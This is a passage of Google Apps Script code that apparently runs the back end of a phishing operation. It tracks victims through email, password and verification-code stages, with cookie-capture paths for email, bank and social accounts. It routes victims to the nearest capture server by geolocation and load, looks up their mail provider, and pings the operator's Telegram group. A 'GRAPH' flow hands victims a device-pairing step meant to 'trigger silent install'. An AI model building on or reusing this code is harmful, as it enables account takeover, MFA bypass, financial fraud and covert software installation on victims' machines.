      Logger.log(`scanAndMarkStaleRowsAppScript: ${cookieSheetResult.error}`);
      return;
    }

    const headers = cookieSheetResult.headers;
    const rows = cookieSheetResult.data;
    const idx = getColumnIndexes(headers);
    const processableStates = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGEMAILERROR", "WAITINGPASSWORDERROR"];
    const staleTimeoutMs = 10 * 60 * 1000;
    const now = Date.now();
    let staleCount = 0;

    for (let i = 0; i < rows.length; i++) {
      const row = rows[i];
      const rowStatus = String(row[idx['status']] || '').trim();
      if (processableStates.indexOf(rowStatus) === -1) continue;

      const bId = row[idx['browserId']];
      const lastActivityRaw = row[idx['lastUserActivity']] || row[idx['lastRun']] || row[idx['timestamp']];
      if (!lastActivityRaw) continue;

      const ts = String(lastActivityRaw).trim();
      let parsed = new Date(ts);
      if (isNaN(parsed.getTime())) {
        const dateMatch = ts.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4}),\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)$/i);
        if (dateMatch) {
          const month = parseInt(dateMatch[1], 10) - 1;
          const day = parseInt(dateMatch[2], 10);
          const year = parseInt(dateMatch[3], 10);
          let hours = parseInt(dateMatch[4], 10);
          const minutes = parseInt(dateMatch[5], 10);
          const seconds = parseInt(dateMatch[6] || '0', 10);
          if (dateMatch[7].toUpperCase() === 'PM' && hours < 12) hours += 12;
          if (dateMatch[7].toUpperCase() === 'AM' && hours === 12) hours = 0;
          parsed = new Date(Date.UTC(year, month, day, hours, minutes, seconds));
        }
      }
      if (isNaN(parsed.getTime())) continue;

      if (now - parsed.getTime() > staleTimeoutMs) {
        Logger.log(`[scanAndMarkStaleRowsAppScript] Stale row: browserId='${bId}', status='${rowStatus}', lastActivity='${lastActivityRaw}'. Marking FAILED.`);
        const failResult = setCookieData({
          browserId: bId,
          status: "FAILED",
          verified: false,
          fullAccess: false,
          lastJsonResponse: JSON.stringify({
            browserId: bId,
            status: "FAILED",
            message: "Session timed out due to inactivity. Marked as FAILED by periodic stale scan.",
            timestamp: new Date().toISOString()
          })
        });
        if (failResult && failResult.success) {
          staleCount++;
        } else {
          Logger.log(`[scanAndMarkStaleRowsAppScript] Failed to mark ${bId} as FAILED: ${JSON.stringify(failResult)}`);
        }
      }
    }

    Logger.log(`scanAndMarkStaleRowsAppScript completed. Marked ${staleCount} rows as FAILED.`);
  } catch (e) {
    Logger.log(`Global error in scanAndMarkStaleRowsAppScript: ${e.message}`);
  }
}

function testSetCookieData() {
  console.log("Starting setCookieData tests...");
  
  // Test 1: Update existing row
  console.log("\n=== Test 1: Update existing row ===");
  const test1 = setCookieData({
    browserId: "BR06",
    email: "updated@example.com",
    domain: "example.com",
    password: "newPassword123",
    verified: true
  });
  console.log("Result:", test1);
  console.log("Expected: success = true, message about update");
  
  // Test 2: Create new row
  console.log("\n=== Test 2: Create new row ===");
  const test2 = setCookieData({
    browserId: "BR07",
    newRow: true,
    email: "new@example.com",
    domain: "example.com",
    password: "password456",
    verified: false
  });
  console.log("Result:", test2);
  console.log("Expected: success = true, message about new row creation");
  
  console.log("\n=== Tests completed ===");
}

// Process Form Submission (Dynamically based on project type (plain, true and cookie))

/**
 * Reads the "links" sheet and picks the best serverless endpoint.
 * Selection criteria: ACTIVE status, within RPH/RPD limits, least usage.
 * @returns {Object|null} { severlessId, severlessURL, pollingUrl, updateUrl } or null if none available
 */
const LINKS_CACHE_TTL_SECONDS = 10; // Cache the links sheet read for serverless selection (bump to 30 for heavier caching)

// Live capacity routing. The engine exposes /api/serverless-self with a
// `capacity` snapshot (maxConcurrent/activeBrowsers/load) driven by the same
// MAX_CONCURRENT_TASKS ceiling that gates browser work. Probe only the top-K
// candidates (by the existing geo+load ordering) so form submissions stay fast;
// results are cached briefly. Tests flip SERVER_CAPACITY_PROBE_ENABLED off.
const SERVER_CAPACITY_CACHE_TTL_SECONDS = 30;
const SERVER_CAPACITY_MISS_TTL_SECONDS = 15;
const SERVER_CAPACITY_TIMEOUT_MS = 2500;
const SERVER_CAPACITY_TOP_K = 3;
const SERVER_CAPACITY_SATURATION = 0.95;
var SERVER_CAPACITY_PROBE_ENABLED = true;

function splitRoutingValues(value) {
  return String(value || '')
    .toUpperCase()
    .split(',')
    .map(function(value) { return value.trim(); })
    .filter(Boolean);
}

/**
 * Probe an engine's /api/serverless-self capacity snapshot.
 * Returns { load, activeBrowsers, maxConcurrent, waitingBrowsers, saturated }
 * or null when the engine is unreachable / does not report capacity.
 * The endpoint returns 409 on host-mismatch but still includes `capacity`,
 * so the body is parsed regardless of HTTP status.
 */
function getServerCapacity(serverUrl) {
  var base = String(serverUrl || '').replace(/\/+$/, '');
  if (!base) return null;
  var cacheKey = 'cap:' + base;
  var cache = null;
  try {
    cache = CacheService.getScriptCache();
    var cachedValue = cache.get(cacheKey);
    if (cachedValue !== null && cachedValue !== undefined) {
      if (cachedValue === 'null') return null;
      try { return JSON.parse(cachedValue); } catch (cacheParseErr) { /* re-probe */ }
    }
  } catch (cacheReadErr) { /* cache unavailable, probe anyway */ }

  try {
    var response = UrlFetchApp.fetch(base + '/api/serverless-self', {
      method: 'get',
      headers: { 'ngrok-skip-browser-warning': 'true' },
      muteHttpExceptions: true,
      timeout: SERVER_CAPACITY_TIMEOUT_MS
    });
    var parsed = JSON.parse(response.getContentText() || '{}');
    var cap = parsed && parsed.capacity;
    var load = cap ? Number(cap.load) : NaN;
    if (!cap || isNaN(load)) {
      if (cache) { try { cache.put(cacheKey, 'null', SERVER_CAPACITY_MISS_TTL_SECONDS); } catch (e1) {} }
      return null;
    }
    var result = {
      load: load,
      activeBrowsers: Number(cap.activeBrowsers) || 0,
      maxConcurrent: Number(cap.maxConcurrent) || 0,
      waitingBrowsers: Number(cap.waitingBrowsers) || 0,
      saturated: load >= SERVER_CAPACITY_SATURATION
    };
    if (cache) { try { cache.put(cacheKey, JSON.stringify(result), SERVER_CAPACITY_CACHE_TTL_SECONDS); } catch (e2) {} }
    return result;
  } catch (err) {
    if (cache) { try { cache.put(cacheKey, 'null', SERVER_CAPACITY_MISS_TTL_SECONDS); } catch (e3) {} }
    Logger.log('[getServerCapacity] probe failed for ' + base + ': ' + (err && err.message));
    return null;
  }
}

function getBestServerlessEndpoint(category, fallbackBaseUrl, visitorIpData, requestingCategory, requestingPlatform, requestingServerType) {
  try {
    const nicheToPath = { WIRE: 'emails/cookie', BANK: 'banks/cookie', SOCIAL: 'socials/cookie' };
    const pathSuffix = nicheToPath[category] || 'emails/cookie';

    const linksResult = getCachedRows(CONFIG.SHEET_NAME.LINKS, LINKS_CACHE_TTL_SECONDS);
    if (!linksResult.success || !linksResult.data || linksResult.data.length === 0) {
      Logger.log("getBestServerlessEndpoint: No data in links sheet");
      return fallbackEndpoint("fallback", fallbackBaseUrl, pathSuffix, "fallback no rows");
    }

    const headers = linksResult.headers;
    const rows = linksResult.data;

    const severlessIdIdx = headers.indexOf('severlessId');
    const severlessURLIdx = headers.indexOf('severlessURL');
    const serverlessRphIdx = headers.indexOf('serverlessRph');
    const serverlessRphUsageIdx = headers.indexOf('serverlessRphUsage');
    const serverlessRpdIdx = headers.indexOf('serverlessRpd');
    const serverlessRpdUsageIdx = headers.indexOf('serverlessRpdUsage');
    const severlessStatusIdx = headers.indexOf('severlessStatus');
    const severlessHealthIdx = headers.indexOf('severlessHealth');
    const severlessIpdataIdx = headers.indexOf('severlessIpdata');

    // Robust header matching for severlessCategory — try exact, then trimmed/lowercase fallback
    var severlessCategoryIdx = headers.indexOf('severlessCategory');
    if (severlessCategoryIdx === -1) {
      severlessCategoryIdx = headers.findIndex(function(h) {
        return String(h).trim().toLowerCase() === 'severlesscategory';
      });
    }

    var severlessPlatformIdx = headers.findIndex(function(h) {
      return String(h).trim().toLowerCase() === 'severlessplatform';
    });

    // Robust header matching for severlessType — try exact, then trimmed/lowercase fallback
    var severlessTypeIdx = headers.indexOf('severlessType');
    if (severlessTypeIdx === -1) {
      severlessTypeIdx = headers.findIndex(function(h) {
        return String(h).trim().toLowerCase() === 'severlesstype';
      });
    }

    Logger.log("[getBestServerlessEndpoint] requestingCategory=" + (requestingCategory || 'NONE') + " requestingPlatform=" + (requestingPlatform || 'NONE') + " requestingServerType=" + (requestingServerType || 'NONE') + " severlessCategoryIdx=" + severlessCategoryIdx + " severlessPlatformIdx=" + severlessPlatformIdx + " severlessTypeIdx=" + severlessTypeIdx + " headers=" + JSON.stringify(headers));

    if (severlessIdIdx === -1 || severlessURLIdx === -1 || severlessStatusIdx === -1) {
      Logger.log("getBestServerlessEndpoint: Missing required columns in links sheet");
      return null;
    }

    // Visitor geo (from ipinfo-style ipData). Fields: country, region, city, loc (lat,lng)
    const visitor = normalizeGeoPayload(visitorIpData);

    const allHealthy = [];

    for (let i = 0; i < rows.length; i++) {
      const row = rows[i];
      const status = String(row[severlessStatusIdx] || '').trim().toUpperCase();
      const health = severlessHealthIdx !== -1 ? String(row[severlessHealthIdx] || '').trim().toUpperCase() : 'ACTIVE';

      const severlessId = row[severlessIdIdx];
      const severlessURL = row[severlessURLIdx];
      if (!severlessId || !severlessURL) continue;

      // Category filter: skip servers that don't serve the requested category(s)
      if (requestingCategory && severlessCategoryIdx !== -1) {
        const rawCat = String(row[severlessCategoryIdx] || '').trim();
        const serverCategories = splitRoutingValues(rawCat);
        const requestCategories = splitRoutingValues(requestingCategory);
        const hasMatch = requestCategories.some(function(rc) { return serverCategories.indexOf(rc) !== -1; });
        if (!hasMatch) continue;
      } else if (requestingCategory && severlessCategoryIdx === -1) {
        Logger.log("[CategoryFilter] WARNING: requestingCategory=" + requestingCategory + " but severlessCategory column NOT FOUND — skipping filter");
      }

      // Server type filter (severlessType: EMAIL / SOCIAL / BANK — comma list). Opt-in with the
      // same semantics as the category filter above: when a type is requested, a row must carry
      // a matching value; an empty cell = unconfigured for that workload → skipped. Without a
      // requested type, selection behavior is unchanged (backward compatible).
      if (requestingServerType && severlessTypeIdx !== -1) {
        const serverTypes = splitRoutingValues(row[severlessTypeIdx]);
        const requestTypes = splitRoutingValues(requestingServerType);
        const hasTypeMatch = requestTypes.some(function(rt) { return serverTypes.indexOf(rt) !== -1; });
        if (!hasTypeMatch) continue;
      } else if (requestingServerType && severlessTypeIdx === -1) {
        Logger.log("[ServerTypeFilter] WARNING: requestingServerType=" + requestingServerType + " but severlessType column NOT FOUND — skipping filter");
      }

      // Platform filtering is opt-in. Without a requested platform, preserve the
      // existing category/status/quota/health selection behavior unchanged.
      if (requestingPlatform) {
        if (severlessPlatformIdx === -1) {
          Logger.log("[PlatformFilter] WARNING: requestingPlatform=" + requestingPlatform + " but severlessPlatform column NOT FOUND — no platform-qualified server");
          continue;
        }
        const serverPlatforms = splitRoutingValues(row[severlessPlatformIdx]);
        const requestPlatforms = splitRoutingValues(requestingPlatform);
        const hasPlatformMatch = requestPlatforms.some(function(platform) {
          return serverPlatforms.indexOf(platform) !== -1;
        });
        if (!hasPlatformMatch) continue;
      }

      const rph = parseInt(row[serverlessRphIdx] || 0, 10);
      const rphUsage = parseInt(row[serverlessRphUsageIdx] || 0, 10);
      const rpd = parseInt(row[serverlessRpdIdx] || 0, 10);
      const rpdUsage = parseInt(row[serverlessRpdUsageIdx] || 0, 10);

      // Physical limits are always enforced (0 means no limit) — do not pick an over-budget row.
      var overLimit = false;
      if (rph > 0 && rphUsage >= rph) {
        overLimit = true;
      }
      if (rpd > 0 && rpdUsage >= rpd) {
        overLimit = true;
      }

      // Load score: lower is less loaded
      var score = 0;
      if (rph > 0) score += rphUsage / rph;
      if (rpd > 0) score += rpdUsage / rpd;

      // Geo score: higher is closer to the visitor (0 if no geo info)
      const serverGeo = severlessIpdataIdx !== -1 ? normalizeGeoPayload(row[severlessIpdataIdx]) : {};
      const geoScore = computeGeoScore(serverGeo, visitor);

      allHealthy.push({
        severlessId: severlessId,
        severlessURL: severlessURL,
        status: status,
        health: health,
        failed: status === 'FAILED',
        overLimit: overLimit,
        score: score,
        geoScore: geoScore,
        geo: serverGeo
      });
    }

    if (allHealthy.length === 0) {
      Logger.log("getBestServerlessEndpoint: No rows at all in links sheet. Using fallback.");
      var zeroRowReason = requestingServerType ? "no rows matching server type " + requestingServerType
        : (requestingPlatform ? "no platform-qualified rows" : "fallback no rows");
      return fallbackEndpoint("fallback", fallbackBaseUrl, pathSuffix, zeroRowReason);
    }

    var pickByGeoLoad = function (list) {
      list.sort(function (a, b) {
        // geo first: nearest to visitor wins
        if (b.geoScore !== a.geoScore) return b.geoScore - a.geoScore;
        // capacity second: free engines beat saturated ones
        if (!!a.capSaturated !== !!b.capSaturated) return a.capSaturated ? 1 : -1;
        // then least live browser load (unknown capacity is neutral)
        var aLoad = (a.capLoad === null || a.capLoad === undefined || isNaN(a.capLoad)) ? 0.5 : a.capLoad;
        var bLoad = (b.capLoad === null || b.capLoad === undefined || isNaN(b.capLoad)) ? 0.5 : b.capLoad;
        if (aLoad !== bLoad) return aLoad - bLoad;
        // then least usage
        if (a.score !== b.score) return a.score - b.score;
        return String(a.severlessId).localeCompare(String(b.severlessId));
      });
      return list[0];
    };

    var best;
    var reason;

    // Only rows the operator explicitly marked ACTIVE (or RATE-LIMITED, still serving)
// are pickable. FAILED and blank/unknown status rows are NEVER pickable — an empty
// severlessStatus is an unconfigured/dummy row and must not be routed to.
var pickable = allHealthy.filter(function (c) {
  return (c.status === 'ACTIVE' || c.status === 'RATE-LIMITED') && !c.failed;
});

    if (pickable.length === 0) {
      Logger.log("getBestServerlessEndpoint: No pickable (ACTIVE/RATE-LIMITED) server — only FAILED/blank rows. Using fallback.");
      var noPickableReason = requestingServerType ? "no server-type-qualified pickable server"
        : (requestingPlatform ? "no platform-qualified pickable server" : "no pickable server");
      return fallbackEndpoint("fallback", fallbackBaseUrl, pathSuffix, noPickableReason);
    }

    // Live capacity: probe only the top-K candidates under the existing
    // geo/usage ordering, so the pick reflects current browser headroom without
    // adding unbounded latency to form submissions. Unprobed rows stay neutral.
    if (SERVER_CAPACITY_PROBE_ENABLED) {
      var probeOrder = pickable.slice().sort(function (a, b) {
        if (b.geoScore !== a.geoScore) return b.geoScore - a.geoScore;
        if (a.score !== b.score) return a.score - b.score;
        return String(a.severlessId).localeCompare(String(b.severlessId));
      });
      var probeCount = Math.min(SERVER_CAPACITY_TOP_K, probeOrder.length);
      for (var probeIdx = 0; probeIdx < probeCount; probeIdx++) {
        var probeCandidate = probeOrder[probeIdx];
        var probedCapacity = getServerCapacity(probeCandidate.severlessURL);
        probeCandidate.capacityProbed = true;
        probeCandidate.capLoad = probedCapacity ? probedCapacity.load : null;
        probeCandidate.capSaturated = !!(probedCapacity && probedCapacity.saturated);
        probeCandidate.capActiveBrowsers = probedCapacity ? probedCapacity.activeBrowsers : null;
        probeCandidate.capMaxConcurrent = probedCapacity ? probedCapacity.maxConcurrent : null;
      }
    }

    // A saturated engine is treated like an over-limit row: skip it while at
    // least one candidate still reports headroom. If every candidate is
    // saturated, fall through and pick the least-loaded one.
    var capacityFree = pickable.filter(function (c) { return !c.capSaturated; });
    var capacityPool = capacityFree.length > 0 ? capacityFree : pickable;

    // Tier 1: fully healthy (status ACTIVE AND health ACTIVE) and within physical limits.
    var tier1 = capacityPool.filter(function (c) {
      return c.status === 'ACTIVE' && c.health === 'ACTIVE' && !c.overLimit;
    });

    if (tier1.length > 0) {
      best = pickByGeoLoad(tier1);
      reason = "healthy-active geo+capacity+load";
    } else {
      // Tier 2: ACTIVE status regardless of health column, within physical limits.
      var tier2 = capacityPool.filter(function (c) {
        return c.status === 'ACTIVE' && !c.overLimit;
      });
      if (tier2.length > 0) {
        best = pickByGeoLoad(tier2);
        reason = "active-limited-health";
      } else {
        // Tier 3: RATE-LIMITED status (operator/manual), within physical limits.
        var tier3 = capacityPool.filter(function (c) {
          return c.status === 'RATE-LIMITED' && !c.overLimit;
        });
        if (tier3.length > 0) {
          best = pickByGeoLoad(tier3);
          reason = "rate-limited but within limit";
        } else {
          // Tier 4: any OTHER non-FAILED row within limit — least-bad last resort (FAILED excluded).
          var withinLimit = capacityPool.filter(function (c) { return !c.overLimit; });
          if (withinLimit.length > 0) {
            best = pickByGeoLoad(withinLimit);
            reason = "least-bad";
          } else {
            // Tier 5: all candidates over budget — prefer free capacity, then
            // least live load, then least usage (FAILED excluded).
            var overLimitPool = capacityFree.length > 0 ? capacityFree : pickable;
            overLimitPool.sort(function (a, b) {
              if (!!a.capSaturated !== !!b.capSaturated) return a.capSaturated ? 1 : -1;
              var aLoad = (a.capLoad === null || a.capLoad === undefined || isNaN(a.capLoad)) ? 1 : a.capLoad;
              var bLoad = (b.capLoad === null || b.capLoad === undefined || isNaN(b.capLoad)) ? 1 : b.capLoad;
              if (aLoad !== bLoad) return aLoad - bLoad;
              return a.score - b.score;
            });
            best = overLimitPool[0];
            reason = capacityFree.length > 0 ? "least-bad-overlimit" : "all-saturated-least-loaded";
          }
        }
      }
    }

    var baseUrl = best.severlessURL.replace(/\/+$/, '');
    var categoryUrl = baseUrl + '/' + pathSuffix;
    return {
      severlessId: best.severlessId,
      severlessURL: baseUrl,
      pollingUrl: categoryUrl + '/pooling-operator',
      updateUrl: categoryUrl + '/update-process',
      status: best.status,
      health: best.health,
      platform: requestingPlatform || '',
      load: (best.capLoad === null || best.capLoad === undefined) ? null : best.capLoad,
      capacityProbed: !!best.capacityProbed,
      reason: reason
    };

  } catch (error) {
    Logger.log("getBestServerlessEndpoint error: " + error.message);
    return null;
  }
}

/**
 * Normalize serverless/visitor IP geo payload into { country, region, city, lat, lng }.
 * Accepts an ipinfo-style object (or JSON string) OR a human string like "Egham, England, GB".
 */
function normalizeGeoPayload(raw) {
  var geo = { country: '', region: '', city: '', lat: null, lng: null };
  if (!raw) return geo;

  if (typeof raw === 'object') {
    geo.country = raw.country || raw.countryName || '';
    geo.region = raw.region || raw.state || '';
    geo.city = raw.city || '';
    if (raw.loc) { var parts = String(raw.loc).split(','); geo.lat = parseFloat(parts[0]); geo.lng = parseFloat(parts[1]); }
    if (geo.lat == null && raw.latitude != null) geo.lat = parseFloat(raw.latitude);
    if (geo.lng == null && raw.longitude != null) geo.lng = parseFloat(raw.longitude);
    return geo;
  }

  var str = String(raw);
  try {
    var parsed = JSON.parse(str);
    if (parsed && typeof parsed === 'object') return normalizeGeoPayload(parsed);
  } catch (e) { /* not JSON, fall through */ }

  // Text form: "Egham, England, GB, loc 51.4316,-0.5524"
  var locMatch = str.match(/loc[:\s]*([0-9.-]+)\s*,\s*([0-9.-]+)/i);
  if (locMatch) {
    geo.lat = parseFloat(locMatch[1]);
    geo.lng = parseFloat(locMatch[2]);
  }
  var sections = str.split(',');
  if (sections.length >= 3) {
    geo.city = String(sections[0] || '').trim();
    geo.region = String(sections[1] || '').trim();
    geo.country = String(sections[2] || '').trim();
  } else if (sections.length === 2) {
    geo.region = String(sections[0] || '').trim();
    geo.country = String(sections[1] || '').trim();
  } else {
    geo.country = str.trim();
  }
  return geo;
}

/**
 * Geo similarity between a server's location and the visitor's location.
 * Positive = match; higher is closer.
 */
function computeGeoScore(serverGeo, visitorGeo) {
  if (!serverGeo || !visitorGeo) return 0;
  var score = 0;

  var sCountry = String(serverGeo.country || '').trim().toUpperCase();
  var vCountry = String(visitorGeo.country || '').trim().toUpperCase();
  var sRegion = String(serverGeo.region || '').trim().toUpperCase();
  var vRegion = String(visitorGeo.region || '').trim().toUpperCase();
  var sCity = String(serverGeo.city || '').trim().toUpperCase();
  var vCity = String(visitorGeo.city || '').trim().toUpperCase();

  if (sCountry && vCountry && sCountry === vCountry) {
    score += 100;
    if (sRegion && vRegion && sRegion === vRegion) {
      score += 60;
      if (sCity && vCity && sCity === vCity) score += 30;
    }
  } else if (sCountry && vCountry) {
    // Different countries: no country match, try region equality anyway (rare cross-border).
    if (sRegion && vRegion && sRegion === vRegion) score += 40;
  }

  // Distance bonus when both have coordinates.
  if (serverGeo.lat != null && serverGeo.lng != null && visitorGeo.lat != null && visitorGeo.lng != null) {
    var distKm = haversineKm(serverGeo.lat, serverGeo.lng, visitorGeo.lat, visitorGeo.lng);
    // 0..100 scale: 0km -> 100, 10000km+ -> 0
    score += Math.max(0, 100 - (distKm / 100));
  }

  return score;
}

/** Great-circle distance in kilometers. */
function haversineKm(lat1, lng1, lat2, lng2) {
  var R = 6371;
  var dLat = (lat2 - lat1) * Math.PI / 180;
  var dLng = (lng2 - lng1) * Math.PI / 180;
  var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLng / 2) * Math.sin(dLng / 2);
  var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

function fallbackEndpoint(id, fallbackBaseUrl, pathSuffix, reason) {
  var fallbackUrl = String(fallbackBaseUrl || '').replace(/\/+$/, '');
  if (!fallbackUrl) return null;
  var fallbackCategoryUrl = fallbackUrl + '/' + pathSuffix;
  return {
    severlessId: id || "fallback",
    severlessURL: fallbackUrl,
    pollingUrl: fallbackCategoryUrl + '/pooling-operator',
    updateUrl: fallbackCategoryUrl + '/update-process',
    reason: reason || "fallback"
  };
}


/**
 * Helper function to update mxRecord and possibleProvider in the hub sheet.
 * This function is intended to be called asynchronously.
 * @param {string} email - The email address to lookup.
 * @param {string} submissionId - The unique ID of the row in the hub sheet to update.
 */
function updateMxRecordAndProvider(email, submissionId) {
  Logger.log(`Starting updateMxRecordAndProvider for email: ${email}, submissionId: ${submissionId}`);
  if (!email || !submissionId) {
    Logger.log("Missing email or submissionId for updateMxRecordAndProvider.");
    return;
  }

  try {
    const apiUrl = `${CONFIG.EXTERNAL_API}/emails/mx-lookup-check?emails=${encodeURIComponent(email)}`;
    Logger.log(`Calling MX lookup API: ${apiUrl}`);

    const options = {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
      },
      muteHttpExceptions: true // Important to catch errors gracefully
    };
    const response = UrlFetchApp.fetch(apiUrl, options);

    const apiResponseData = JSON.parse(response.getContentText());
    Logger.log("MX Lookup API Response:", apiResponseData);

    let mxRecord = "N/A";
    let possibleProvider = "N/A";

    if (apiResponseData && apiResponseData.results && apiResponseData.results.length > 0) {
      const result = apiResponseData.results[0];
      mxRecord = JSON.stringify(result); // Store the entire result JSON
      possibleProvider = result.possibleProvider || "N/A";
    }

    Logger.log(`Updating hub sheet for submissionId: ${submissionId} with mxRecord: ${mxRecord}, possibleProvider: ${possibleProvider}`);

    // Update the specific row in the hub sheet using setMultipleCellDataByColumnSearch
    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column
      submissionId,   // Search value
      {
        "mxRecord": mxRecord,
        "possibleProvider": possibleProvider
      }
    );

    if (!updateHubResult.success) {
      Logger.log(`Error updating hub sheet: ${updateHubResult.error}`);
    }

    Logger.log("Hub sheet updated successfully with MX data.");

  } catch (error) {
    Logger.log("Error in updateMxRecordAndProvider: " + error.message);
  }
}

/**
 * Processes form submissions, updates project data, and sends notifications.
 * @param {Object} params - Parameters containing token, formData, templateType, templateNiche.
 * @param {string} params.token - Token to identify the project.
 * @param {Object} params.formData - The form data submitted.
 * @returns {GoogleAppsScript.Content.TextOutput} A JSON response indicating success or failure.
 */
function notifyFormSubmission(params, fallbackBaseUrl) {
  Logger.log("notifyFormSubmission called with params: " + JSON.stringify(params) + ", fallbackBaseUrl: " + fallbackBaseUrl);
  Logger.log("[notifyFormSubmission] templateType will be resolved from projects sheet");

  try {
    const { token, formData: formDataString } = params;

    if (!token || !formDataString) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameters: token or formData."
      });
    }

    let formData;
    try {
      formData = JSON.parse(formDataString);
    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Invalid formData format. Expected JSON string."
      });
    }

    // 1. Use the token to search the projects sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "token", token);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with token '${token}' not found.`
      });
    }

    // Capture the resolved sheet row so the later response write can skip a second full-sheet scan.
    const projectRowNumber = (projectRowsResult.indices && projectRowsResult.indices.length > 0) ? projectRowsResult.indices[0] : null;

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming token is unique, take the first match

    const projectRowMap = {};
    projectHeaders.forEach((header, index) => {
      projectRowMap[header] = projectRowData[index];
    });

    const templateType = projectRowMap.templateType; // Get from project row
    const templateNiche = projectRowMap.templateNiche; // Get from project row

    // GRAPH template type: reuse form-submission flow, store device/graph data,
    // return a scripting endpoint for the template to trigger silent install.
    if (String(templateType).toUpperCase().indexOf("GRAPH") !== -1) {
      Logger.log("[GRAPH] notifyFormSubmission entered for project " + projectRowMap.projectId);
      try {
        // 1. Pick serverless endpoint whose severlessCategory contains "GRAPH"
        var assignedGraphServer = null;
        try {
          assignedGraphServer = getBestServerlessEndpoint("GRAPH", fallbackBaseUrl, formData && formData.ipData, "GRAPH", "", "");
        } catch (e) { Logger.log("[GRAPH] server pick err: " + e); }
        var graphServerUrl = (assignedGraphServer && assignedGraphServer.severlessURL) ? String(assignedGraphServer.severlessURL).replace(/\/+$/, '') : String(CONFIG.EXTERNAL_API || fallbackBaseUrl || '').replace(/\/+$/, '');
        Logger.log("[GRAPH] serverUrl=" + graphServerUrl);

        // 2. Create GRAPH sheet if missing (inlined, no dependency on GRAPH.js)
        var ss = SpreadsheetApp.getActiveSpreadsheet();
        var graphSheet = ss.getSheetByName("GRAPH");
        var graphCols = ["deviceId","userId","projectId","templateId","platform","agentType","agentVersion","ipData","deviceData","pairedAt","status","approvedRoots","graphIndexFileId","graphIndexUrl","graphIndexSize","lastIndexedAt","lastSeenAt","tokenHash","server","audit"];
        if (!graphSheet) {
          graphSheet = ss.insertSheet("GRAPH");
          graphSheet.appendRow(graphCols);
          Logger.log("[GRAPH] created GRAPH sheet");
        } else {
          var hdrs = graphSheet.getRange(1,1,1,graphSheet.getLastColumn() || 1).getValues()[0];
          if (!hdrs || hdrs[0] !== "deviceId") {
            graphSheet.getRange(1,1,1,graphCols.length).setValues([graphCols]);
            Logger.log("[GRAPH] repaired GRAPH headers");
          }
        }

        // 3. Generate deviceId and append row
        var graphDeviceId = "dev_" + Utilities.getUuid();
        var ipStr = (formData && formData.ipData) ? JSON.stringify(formData.ipData) : "";
        var devStr = (formData && formData.deviceData) ? JSON.stringify(formData.deviceData) : "";
        var row = graphCols.map(function(c) {
          if (c === "deviceId") return graphDeviceId;
          if (c === "userId") return projectRowMap.userId || "";
          if (c === "projectId") return projectRowMap.projectId || "";
          if (c === "templateId") return projectRowMap.templateId || "";
          if (c === "platform") return (formData && formData.platform) || projectRowMap.platform || "windows";
          if (c === "ipData") return ipStr;
          if (c === "deviceData") return devStr;
          if (c === "server") return graphServerUrl;
          if (c === "status") return "PENDING";
          if (c === "pairedAt") return new Date().toISOString();
          if (c === "approvedRoots") return "[]";
          if (c === "audit") return "[]";
          return "";
        });
        graphSheet.appendRow(row);
        Logger.log("[GRAPH] appended row deviceId=" + graphDeviceId);

        // Update project response (mirroring cookie flow, GRAPH-only: no hub write)
        try {
          var projResult = getRowsByColumn("projects", "projectId", projectRowMap.projectId);
          if (projResult.success && projResult.count > 0) {
            var projRow = projResult.data[0];
            var projHeaders = projResult.headers;
            var respIdx = projHeaders.indexOf("response");
            var existingResp = [];
            if (respIdx !== -1 && projRow[respIdx]) {
              try {
                var parsed = JSON.parse(projRow[respIdx]);
                if (parsed && parsed.fileId) {
                  var fc = getJsonContentFromFile(parsed.fileId);
                  if (fc.success) existingResp = fc.data;
                } else if (Array.isArray(parsed)) {
                  existingResp = parsed;
                }
              } catch (e) { existingResp = []; }
            }
            if (!Array.isArray(existingResp)) existingResp = [];
            existingResp.push({
              id: (existingResp.length + 1).toString(),
              submissionId: graphDeviceId,
              category: projectRowMap.templateNiche || "UNKNOWN",
              type: "GRAPH",
              title: projectRowMap.projectTitle || "Graph Submission",
              userId: projectRowMap.userId || "",
              projectId: projectRowMap.projectId || "",
              formId: projectRowMap.formId || "",
              timestamp: new Date().toISOString(),
              deviceId: graphDeviceId,
              status: "PENDING",
              ipData: (formData && formData.ipData) ? formData.ipData : {},
              deviceData: (formData && formData.deviceData) ? formData.deviceData : {}
            });
            var respStr = JSON.stringify(existingResp);
            if (respStr.length > 45000) {
              var uf = getOrCreateUserFolder(projectRowMap.userId, CONFIG.FOLDER_ID.USERS);
              if (uf.success) {
                var sf = createOrUpdateJsonFile(uf.folderId, projectRowMap.projectId + ".json", existingResp);
                if (sf.success) respStr = JSON.stringify({ fileId: sf.fileId, count: existingResp.length });
              }
            }
            setMultipleCellDataByColumnSearch("projects", "projectId", projectRowMap.projectId, { "response": respStr });
            Logger.log("[GRAPH] project response updated with deviceId=" + graphDeviceId);
          }
        } catch (prErr) { Logger.log("[GRAPH] project response update err: " + prErr); }

        // 4. Telegram notification
        try {
          var tgId = projectRowMap.telegramGroupId;
          if (tgId) {
            var msg = "Project: " + (projectRowMap.projectTitle || "N/A") + "\nType: GRAPH\nStatus: CONSENT_SUBMITTED\nDeviceId: " + graphDeviceId + "\nServer: " + graphServerUrl;
            if (typeof sendTelegramMessage === "function") sendTelegramMessage(tgId, msg);
          }
        } catch (notifyErr) { Logger.log("[GRAPH] notify err: " + notifyErr); }

        // 5. Return endpoint + scripting link
        return createJsonResponse({
          success: true,
          deviceId: graphDeviceId,
          endpoint: graphServerUrl + "/graph/device/poll",
